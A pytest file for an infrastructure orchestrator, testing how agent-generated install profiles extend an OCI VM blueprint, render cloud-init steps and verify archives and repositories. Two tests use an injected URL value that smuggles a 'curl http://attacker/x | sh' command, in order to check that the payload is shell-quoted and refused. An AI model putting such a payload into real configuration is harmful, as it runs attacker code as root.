"""The agent teaches the proven module a new technology (C6).

Most components with no recipe do not need new Terraform. keycloak, kafka,
mongodb, vault and their like are SOFTWARE ON A MACHINE, and `oci/service-vm`
already builds machines properly: it resolves the image from OCI at run time
filtered by shape, keeps the instance on a private subnet, enables Run Command
so the machine can be interrogated, and makes it report what it became. Every one
of those behaviours was paid for by a failure on a real request.

What such a component actually needs is a package, a systemd unit and a port —
what that module's own manifest calls "a data change". Writing it a second
Terraform module would duplicate a working one AND collide on its resource kind,
which is the failure the registry refuses.

So the agent writes a PROFILE, and it extends the shipped blueprint rather than
competing with it. Two gates have to learn the new code, and missing either one
is silent: the blueprint's `builds` list (or `_components_for` drops it before
configuration is even considered) and configure.py's template (or there is no
recipe to render).
"""

from __future__ import annotations

import json

import pytest

from orchestrator import blueprint_registry, configure

KEYCLOAK = {
    "code": "keycloak",
    "builds_on": "oci/service-vm",
    "ports": [8080],
    "expects": "26",
    "version_command": "/opt/keycloak/bin/kc.sh --version 2>&1",
    "rhel": {"packages": ["keycloak"], "services": ["keycloak"]},
}


@pytest.fixture()
def store(tmp_path, monkeypatch):
    d = tmp_path / "profiles"
    d.mkdir()
    monkeypatch.setattr(configure, "GENERATED_PROFILE_DIR", d)
    return d


def write(store, profile, name=None):
    (store / f"{name or profile['code']}.json").write_text(
        json.dumps(profile), encoding="utf-8")


# --- gate 1: configure.py must carry a recipe --------------------------------

def test_a_generated_profile_becomes_an_installable_recipe(store):
    write(store, KEYCLOAK)
    prof = configure.profile_for("keycloak", "rhel")

    assert prof is not None, "the machine would be given nothing to install"
    assert prof["packages"] == ["keycloak"]
    assert prof["services"] == ["keycloak"]
    assert prof["ports"] == [8080]


def test_it_appears_among_the_configurable_codes(store):
    write(store, KEYCLOAK)
    assert "keycloak" in configure.configurable_codes()


def test_a_family_the_profile_does_not_cover_is_refused_not_guessed(store):
    """Falling back to Red Hat package names on an Ubuntu machine is the exact
    failure profile_for's signature exists to prevent."""
    write(store, KEYCLOAK)
    assert configure.profile_for("keycloak", "debian") is None


# --- shipped always wins -----------------------------------------------------

def test_a_generated_profile_may_not_shadow_a_shipped_one(store):
    """nginx has a profile somebody checked against a real image. An agent
    proposing a different one must not be able to take its place — the same rule
    the blueprint registry applies to manifests, for the same reason."""
    write(store, {"code": "nginx", "builds_on": "oci/service-vm",
                  "ports": [9999], "rhel": {"packages": ["not-nginx"],
                                            "services": ["not-nginx"]}})
    prof = configure.profile_for("nginx", "rhel")
    assert prof["packages"] == ["nginx"], "an agent overwrote a reviewed recipe"
    assert 9999 not in prof["ports"]


def test_an_operator_override_still_wins_over_both(store, monkeypatch):
    """CONFIG_PACKAGE_MAP is how a live image gets corrected without a deploy.
    It has to outrank a generated profile or that escape hatch is gone."""
    write(store, KEYCLOAK)
    monkeypatch.setenv("CONFIG_PACKAGE_MAP",
                       json.dumps({"keycloak": {"packages": ["keycloak-26"],
                                                "services": ["keycloak"]}}))
    assert configure.profile_for("keycloak", "rhel")["packages"] == ["keycloak-26"]


# --- a broken draft must not take the catalogue down -------------------------

def test_malformed_json_is_skipped_not_raised(store):
    (store / "broken.json").write_text("{not json at all", encoding="utf-8")
    write(store, KEYCLOAK)
    assert configure.profile_for("keycloak", "rhel") is not None


def test_a_missing_store_is_empty_rather_than_an_error(tmp_path, monkeypatch):
    monkeypatch.setattr(configure, "GENERATED_PROFILE_DIR", tmp_path / "nope")
    assert configure._generated_profiles() == {}
    assert configure.profile_for("nginx", "rhel") is not None


# --- gate 2: the blueprint's builds list -------------------------------------

def test_the_profile_extends_the_shipped_blueprints_builds(store):
    """THE gate that is silent when missed. A component absent from `builds` is
    dropped by _components_for before first-boot configuration is even
    considered, so the machine boots bare and reports success."""
    write(store, KEYCLOAK)
    vm = next(b for b in blueprint_registry.discover()
              if b.get("ref") == "oci/service-vm")

    assert "keycloak" in vm["builds"]
    assert "nginx" in vm["builds"], "it replaced the manifest's own list"


def test_what_the_agent_added_is_reported_separately(store):
    """A reader must always be able to tell what a person put on this blueprint
    from what a machine added to it."""
    write(store, KEYCLOAK)
    vm = next(b for b in blueprint_registry.discover()
              if b.get("ref") == "oci/service-vm")

    assert vm["builds_generated"] == ["keycloak"]
    assert "nginx" not in vm["builds_generated"]


def test_a_profile_naming_no_blueprint_extends_nothing(store):
    write(store, {**KEYCLOAK, "builds_on": ""})
    for b in blueprint_registry.discover():
        assert "keycloak" not in b["builds"]


# --- archive installs: the tarball path (C6b) --------------------------------

ARCHIVE_PROFILE = {
    "code": "keycloak",
    "builds_on": "oci/service-vm",
    "ports": [8080],
    "expects": "26",
    "version_command": "/opt/keycloak/bin/kc.sh --version 2>&1",
    "archive": {
        "url": "https://example.com/keycloak-26.7.2.tar.gz",
        "sha256": "f" * 64,
        "dest": "/opt/keycloak",
        "user": "keycloak",
        "unit": {"description": "Keycloak",
                 "exec_start": "/opt/keycloak/bin/kc.sh start-dev"},
    },
    "rhel": {"packages": ["java-21-openjdk-headless"], "services": ["keycloak"]},
}


def rendered(store, monkeypatch, profile=None):
    write(store, profile or ARCHIVE_PROFILE)
    monkeypatch.setenv("CONFIG_ENABLED", "true")
    return configure.render([{"technology_code": "keycloak"}], "rhel",
                            "https://example/report")


def test_an_archive_install_renders_fetch_check_unpack_unit_start(store, monkeypatch):
    """The whole chain, in dependency order: deps install, fetch, checksum,
    unpack, unit written, daemon-reload, enable. Any link missing is a machine
    that boots healthy with nothing on it — the original silent success."""
    out = rendered(store, monkeypatch)

    for step in ("curl -fsSL", "sha256sum -c", "tar -xzf",
                 "/etc/systemd/system/keycloak.service", "kc.sh start-dev",
                 "systemctl daemon-reload", "enable --now keycloak"):
        assert step in out, f"missing: {step}"
    assert out.index("daemon-reload") < out.index("enable --now keycloak"), (
        "enable ran before systemd had read the unit")
    assert out.index("tar -xzf") > out.index("curl -fsSL")


def test_the_rendered_cloud_config_is_valid_yaml(store, monkeypatch):
    """'Failed to shellify' is why no service-vm ever installed anything, once.
    Every new line class has to re-earn this."""
    import yaml

    doc = yaml.safe_load(rendered(store, monkeypatch))
    assert isinstance(doc, dict)
    assert all(isinstance(c, str) for c in doc["runcmd"])


def test_a_mismatched_checksum_deletes_the_archive_before_unpack(store, monkeypatch):
    """Root is about to execute what is inside. A marker alone would not stop
    the tar step that follows — the file itself must be gone."""
    out = rendered(store, monkeypatch)
    check = next(line for line in out.splitlines() if "sha256sum -c" in line)
    assert "rm -f /tmp/portal-archive-keycloak.tgz" in check, (
        "a tampered archive would still be unpacked")


def test_the_report_judges_an_archive_by_its_destination_not_rpm(store, monkeypatch):
    """rpm -q keycloak reports NOT INSTALLED on every healthy machine, because
    keycloak is not an RPM. Asking the package question about an archive fails
    working installs forever."""
    out = rendered(store, monkeypatch)
    assert "archive_keycloak=" in out
    assert "rpm -q keycloak " not in out


def test_the_archive_evidence_is_a_NON_EMPTY_destination(store, monkeypatch):
    """FOUND BY REVIEW. `test -d {dest}` was a tautology: the unpack step ran
    `mkdir -p {dest}` in the same command immediately before tar, so the
    directory existed on every machine — including ones where the fetch 404'd,
    the checksum mismatched and the tarball was deleted. A check that cannot
    fail is the third one this project shipped in a day."""
    out = rendered(store, monkeypatch)
    check = next(l for l in out.splitlines() if "archive_keycloak=" in l)
    assert "ls -A" in check, f"the evidence is still satisfiable by an empty directory: {check}"
    assert "test -d /opt/keycloak &&" not in check


def test_an_unpack_that_extracted_nothing_leaves_a_failure_marker(store, monkeypatch):
    """`tar --strip-components=1` on an archive whose members sit at the top
    level extracts NOTHING and exits 0 — a silent install of nothing, which is
    exactly what a proof must never certify."""
    out = rendered(store, monkeypatch)
    assert "unpacked no files" in out


def test_a_dangerous_value_reaching_the_renderer_is_still_neutralised(store, monkeypatch):
    """THIRD LOCK, tested past the second one.

    profile_rules refuses a URL containing a semicolon, and _generated_profiles
    refuses to load such a profile — so this bypasses both to ask the question
    they exist to make moot: if a dangerous value DID reach render(), does it
    become a root command? Two locks on one door is the rule everywhere else in
    this system (the publish path, the proof authority), and the renderer is the
    last one.
    """
    evil = {**ARCHIVE_PROFILE, "archive": {
        **ARCHIVE_PROFILE["archive"],
        "url": "https://x/k.tar.gz; curl http://attacker/x | sh"}}
    monkeypatch.setattr(configure, "_generated_profiles", lambda: {"keycloak": evil})
    monkeypatch.setenv("CONFIG_ENABLED", "true")
    out = configure.render([{"technology_code": "keycloak"}], "rhel", "https://r")

    fetch = next(l for l in out.splitlines() if "curl -fsSL" in l)
    assert "'https://x/k.tar.gz; curl http://attacker/x | sh'" in fetch, (
        f"the payload was not shell-quoted and would run as root: {fetch}")


def test_the_second_lock_refuses_that_profile_before_it_can_render(store, monkeypatch):
    """And the lock the test above deliberately bypassed does hold."""
    write(store, {**ARCHIVE_PROFILE, "archive": {
        **ARCHIVE_PROFILE["archive"],
        "url": "https://x/k.tar.gz; curl http://attacker/x | sh"}})
    assert configure._generated_profiles() == {}, (
        "an invalid profile was loaded from the store")


def test_a_generated_profiles_version_check_reaches_the_machine(store, monkeypatch):
    """THE latent C6 bug this increment surfaced: the report's version lookup
    read TEMPLATES alone, so an agent-written profile's expects/version_command
    never reached the machine and nobody ever asked which version arrived —
    the exact silence that shipped Redis 6.2 as 7."""
    out = rendered(store, monkeypatch)
    assert "version_keycloak=" in out, "the generated profile was never version-checked"
    assert "kc.sh --version" in out


def test_slow_archive_software_gets_a_bounded_wait_before_the_report(store, monkeypatch):
    """keycloak builds itself on first start; a report filed the instant enable
    returned would call a healthy machine broken on the port check. Bounded:
    a service that never answers still fails, minutes later, on the same
    evidence."""
    out = rendered(store, monkeypatch)
    wait = next((l for l in out.splitlines() if "seq 1 60" in l), None)
    assert wait is not None and "8080" in wait
    assert out.index("seq 1 60") < out.index("infra-portal-report.sh || true")


def test_an_archive_only_family_block_still_resolves(store, monkeypatch):
    """The software IS the archive; a family block with no packages must not
    read as 'this family is not covered'."""
    profile = {**ARCHIVE_PROFILE, "rhel": {"packages": [], "services": ["keycloak"]}}
    write(store, profile)
    prof = configure.profile_for("keycloak", "rhel")
    assert prof is not None and prof["archive"] is not None


def test_a_family_without_a_block_is_still_refused(store, monkeypatch):
    """Archive steps are family-neutral, but coverage is not: what this family
    was PROVEN to run is a per-family claim the proof makes one family at a
    time."""
    write(store, ARCHIVE_PROFILE)
    assert configure.profile_for("keycloak", "debian") is None


# --- declaring the egress an archive install needs ---------------------------

def test_an_archive_profile_declares_that_it_needs_the_internet(store):
    """The check the portal makes BEFORE spending a machine is only as good as
    what the orchestrator tells it. An archive fetches its software from a
    release host, so a subnet with only a service gateway installs every Oracle
    RPM and then cannot reach github — and the OS-family check cannot see that,
    because the family (rhel) is perfectly supported."""
    write(store, ARCHIVE_PROFILE)
    vm = next(b for b in blueprint_registry.discover()
              if b.get("ref") == "oci/service-vm")

    assert "keycloak" in vm["needs_internet"], (
        "the portal cannot refuse this up front and will spend a sandbox VM to "
        "learn what the subnet's route table already said")


def test_a_package_profile_declares_no_such_need(store):
    """Oracle Linux packages come over the service gateway. Claiming otherwise
    would refuse the whole catalogue on a subnet with no NAT."""
    write(store, {**ARCHIVE_PROFILE, "code": "haproxy",
                  "archive": None, "rhel": {"packages": ["haproxy"],
                                            "services": ["haproxy"]}})
    vm = next(b for b in blueprint_registry.discover()
              if b.get("ref") == "oci/service-vm")
    assert "haproxy" not in vm["needs_internet"]


def test_the_shipped_manifest_declares_the_field(store):
    """Declared in the manifest even though it currently lists nothing — a field
    that only appears when it is non-empty is a field nobody knows to set."""
    vm = next(b for b in blueprint_registry.discover()
              if b.get("ref") == "oci/service-vm")
    assert "needs_internet" in vm
    for shipped in ("nginx", "redis7", "java21", "python312", "nodejs20"):
        assert shipped not in vm["needs_internet"], (
            f"{shipped} installs from the OS repositories and must not be "
            f"refused on a subnet with no NAT")


# --- vendor repositories: judged by the file, not by the technology name ------

REPO_PROFILE = {
    "code": "vault", "builds_on": "oci/service-vm", "ports": [8200],
    "expects": "1", "version_command": "vault version 2>&1",
    "repo": {"url": "https://rpm.releases.hashicorp.com/RHEL/hashicorp.repo",
             "gpg_key": "https://rpm.releases.hashicorp.com/gpg"},
    "rhel": {"packages": ["vault"], "services": ["vault"]},
}


def test_the_repository_is_added_before_the_install_that_needs_it(store, monkeypatch):
    """`dnf install vault` finds nothing until HashiCorp's repository is there.
    Ordering these the other way round is a machine that installs nothing and
    says so five minutes later."""
    write(store, REPO_PROFILE)
    monkeypatch.setenv("CONFIG_ENABLED", "true")
    out = configure.render([{"technology_code": "vault"}], "rhel", "https://r")

    assert out.index("rpm --import") < out.index("config-manager"), (
        "the signing key is imported after the repository that needs it")
    assert out.index("config-manager") < out.index("dnf install"), (
        "the repository is added after the install")


def test_the_repo_evidence_tests_the_FILE_not_the_technology_name(store, monkeypatch):
    """FOUND BEFORE IT COST A MACHINE. `dnf config-manager --add-repo <url>`
    writes /etc/yum.repos.d/<basename>, and that basename is the VENDOR's —
    hashicorp.repo, not vault.repo. Grepping `dnf repolist` for the technology
    code would report repo_vault=failed on a machine where the repository had
    been added perfectly, failing the proof for a reason that was not true."""
    write(store, REPO_PROFILE)
    monkeypatch.setenv("CONFIG_ENABLED", "true")
    out = configure.render([{"technology_code": "vault"}], "rhel", "https://r")

    check = next(l for l in out.splitlines() if "repo_vault=" in l)
    assert "/etc/yum.repos.d/hashicorp.repo" in check, check
    assert "repolist" not in check, "it is still matching on the technology name"
